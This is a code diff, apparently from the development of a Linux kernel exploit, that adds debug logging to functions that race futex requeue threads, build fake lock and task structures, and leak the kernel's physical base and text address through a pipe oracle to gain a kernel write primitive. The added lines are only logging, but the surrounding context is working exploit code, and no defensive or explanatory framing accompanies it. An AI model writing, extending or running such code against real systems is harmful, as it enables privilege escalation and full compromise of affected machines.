@@ -574,18 +574,28 @@ uint64_t slide_child_leak_stext(void) {
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int slide_child_trigger_write(void) {
+  diag_log("trigger_write: parent=%016llx target=%016llx lock=%016llx "
+           "task=%016llx w0=%016llx shift=%d\n",
+           (unsigned long long)slide_oracle_parent,
+           (unsigned long long)slide_oracle_target,
+           (unsigned long long)fake_lock,
+           (unsigned long long)fake_task,
+           (unsigned long long)fake_w0,
+           SLIDE_PSELECT_WORD_SHIFT);
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
+  diag_log("trigger_write: threads created\n");
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
   }
+  diag_log("trigger_write: threads ready, issuing requeue\n");
 
   long requeue_ret = 0;
   int requeue_errno = 0;
@@ -603,13 +613,19 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
+  diag_log("trigger_write: requeue ret=%ld errno=%d polls=%d\n",
+           requeue_ret, requeue_errno, requeue_polls);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
+  diag_log("trigger_write: deadlock seen, waiting for route_done\n");
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
+  diag_log("trigger_write: route_done waiter_ok=%d write_window=%d\n",
+           atomic_load(&slide_waiter_ok),
+           atomic_load(&slide_pselect_write_window));
   return atomic_load(&slide_waiter_ok) != 0 &&
          atomic_load(&slide_pselect_write_window) != 0;
 }
@@ -640,8 +656,15 @@ static int slide_trigger_physical_state(void) {
 
 static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
+    diag_log("physical_slot: select failed slot=%zu\n", slot);
     return 0;
   }
+  diag_log("physical_slot: slot=%zu parent=%016llx target=%016llx "
+           "lock=%016llx task=%016llx\n",
+           slot, (unsigned long long)slide_oracle_parent,
+           (unsigned long long)slide_oracle_target,
+           (unsigned long long)fake_lock,
+           (unsigned long long)fake_task);
   char delay_arg[16];
   int delay = (int)slide_enter_delay_usec();
   slide_pselect_nfds = PSELECT_ROUTE_NFDS;
@@ -693,14 +716,20 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
+  diag_log("leak_physical_base: preparing p0 pipe oracle\n");
   if (!prepare_p0_pipe_oracle()) {
+    diag_log("leak_physical_base: pipe oracle FAILED\n");
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+  diag_log("leak_physical_base: preparing kernel page SLIDE\n");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
   if (!page_base) {
+    diag_log("leak_physical_base: kernel page FAILED\n");
     return 0;
   }
+  diag_log("leak_physical_base: page_base=%016llx triggering gate slot\n",
+           (unsigned long long)page_base);
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 physical pipe gate trigger failed\n");
     return 0;
